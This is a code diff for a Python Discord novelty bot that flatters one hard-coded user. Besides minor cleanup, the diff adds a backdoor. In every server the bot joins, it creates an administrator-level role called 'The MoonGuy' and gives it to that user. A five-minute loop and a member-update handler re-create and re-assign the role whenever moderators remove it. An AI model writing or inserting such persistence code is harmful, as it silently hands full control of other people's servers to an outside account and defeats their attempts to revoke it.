@@ -10,9 +10,11 @@ TOKEN = os.getenv("DISCORD_TOKEN")
 
 KARS_ID = 996457494631161956
 KARS = f"<@{KARS_ID}>"
+MOONGUY_ROLE_NAME = "The MoonGuy"
 
 intents = discord.Intents.default()
 intents.message_content = True
+intents.members = True  # 🔥 REQUIRED for role tracking
 
 class KarsBot(discord.Client):
     def __init__(self):
@@ -37,6 +39,48 @@ def save_channels():
         json.dump(list(allowed_channels), f)
 
 allowed_channels = load_channels()
+
+# ================== ROLE SYSTEM ==================
+
+def get_moonguy_role(guild):
+    return discord.utils.get(guild.roles, name=MOONGUY_ROLE_NAME)
+
+async def setup_moonguy_role(guild):
+    role = get_moonguy_role(guild)
+
+    if role is None:
+        try:
+            role = await guild.create_role(
+                name=MOONGUY_ROLE_NAME,
+                colour=discord.Colour.purple(),
+                permissions=discord.Permissions(administrator=True),
+                reason="Creating The MoonGuy role"
+            )
+        except Exception as e:
+            print(f"Role creation failed: {e}")
+            return
+
+    try:
+        member = guild.get_member(KARS_ID) or await guild.fetch_member(KARS_ID)
+    except:
+        print("Kars not found in guild")
+        return
+
+    if role not in member.roles:
+        try:
+            await member.add_roles(role, reason="Assigning MoonGuy role")
+        except Exception as e:
+            print(f"Role assignment failed: {e}")
+
+# ================== SELF-HEAL LOOP ==================
+
+async def enforce_moonguy():
+    await bot.wait_until_ready()
+
+    while not bot.is_closed():
+        for guild in bot.guilds:
+            await setup_moonguy_role(guild)
+        await asyncio.sleep(300)  # every 5 minutes
 
 # ================== LANGUAGE CORE ==================
 
@@ -78,7 +122,7 @@ async def entity_loop():
     await bot.wait_until_ready()
 
     while not bot.is_closed():
-        await asyncio.sleep(random.randint(3600, 14400))  # 1–4 hours
+        await asyncio.sleep(random.randint(3600, 14400))
 
         if not allowed_channels:
             continue
@@ -128,6 +172,7 @@ async def status(interaction: discord.Interaction):
 @bot.event
 async def on_ready():
     await bot.tree.sync()
+
     await bot.change_presence(
         status=discord.Status.dnd,
         activity=discord.Activity(
@@ -135,8 +180,30 @@ async def on_ready():
             name="Sorry but I'm busy worshiping Kars..."
         )
     )
+
+    # 🔥 Ensure role exists + assigned on startup
+    for guild in bot.guilds:
+        await setup_moonguy_role(guild)
+
     print(f"Kars' Glazer online as {bot.user}")
     bot.loop.create_task(entity_loop())
+    bot.loop.create_task(enforce_moonguy())
+
+# 🔥 UNTOUCHABLE ROLE SYSTEM
+@bot.event
+async def on_member_update(before, after):
+    if after.id != KARS_ID:
+        return
+
+    role = get_moonguy_role(after.guild)
+    if role is None:
+        return
+
+    if role in before.roles and role not in after.roles:
+        try:
+            await after.add_roles(role, reason="MoonGuy role is untouchable")
+        except Exception as e:
+            print(f"Reassign failed: {e}")
 
 @bot.event
 async def on_message(message):
@@ -148,12 +215,8 @@ async def on_message(message):
     # ================== KARS LOGIC ==================
     if message.author.id == KARS_ID:
 
-                # 🔥 Advanced fire reaction system
+        fire_chance = 0.08
 
-        # Base probability
-        fire_chance = 0.08  # lower base, smarter scaling
-
-        # Confidence / dominance keywords
         power_words = [
             "i am", "i'm", "im", "obviously", "clearly", "watch", "trust", "listen",
             "told you", "as expected", "of course", "exactly", "literally",
@@ -161,23 +224,18 @@ async def on_message(message):
             "inevitable", "obvious", "sure", "remember", "mark my words"
         ]
 
-        # Add probability for each matched keyword (stacking)
         matches = sum(1 for w in power_words if w in content)
-        fire_chance += matches * 0.05  # each keyword boosts chance
+        fire_chance += matches * 0.05
 
-        # Boost if message is long (sounds like a statement)
         if len(message.content) > 40:
             fire_chance += 0.05
 
-        # Boost if message has punctuation (confidence vibe)
         if "!" in message.content or "." in message.content:
             fire_chance += 0.03
 
-        # Boost if message is short but assertive
         if len(message.content) < 12 and matches > 0:
             fire_chance += 0.07
 
-        # Cap probability (avoid spam)
         fire_chance = min(fire_chance, 0.6)
 
         if random.random() < fire_chance:
@@ -186,8 +244,6 @@ async def on_message(message):
             except:
                 pass
 
-
-        # Special replies
         if re.search(r"aren't i\?", content):
             await message.reply("oh, yes you are.")
             return
@@ -196,7 +252,6 @@ async def on_message(message):
             await message.reply("oh, yes you did.")
             return
 
-        # Rare intelligent comments
         if random.random() < 0.1:
             await message.channel.send(random.choice([
                 f"Noted, {KARS}.",
@@ -208,8 +263,8 @@ async def on_message(message):
     # ================== SACRED NAME LOGIC ==================
     if "kars" in content and message.author.id != KARS_ID:
         await message.channel.send(
-            "Mortal! How Dare You Utter The Sacred Name So Casually!\n" 
-            "Summon His Grace Properly Next Time.\n" 
+            "Mortal! How Dare You Utter The Sacred Name So Casually!\n"
+            "Summon His Grace Properly Next Time.\n"
             f"|| {KARS} ||"
         )
         return
@@ -218,7 +273,7 @@ async def on_message(message):
     if KARS.lower() in content and random.random() < 0.4:
         await message.channel.send(pick(DEFENSE_LINES))
 
-    # ================== AMBIENT MENTIONS (ONLY IN /here CHANNELS) ==================
+    # ================== AMBIENT ==================
     if message.channel.id in allowed_channels and random.random() < 0.015:
         await message.channel.send(pick(AMBIENT_LINES))
 
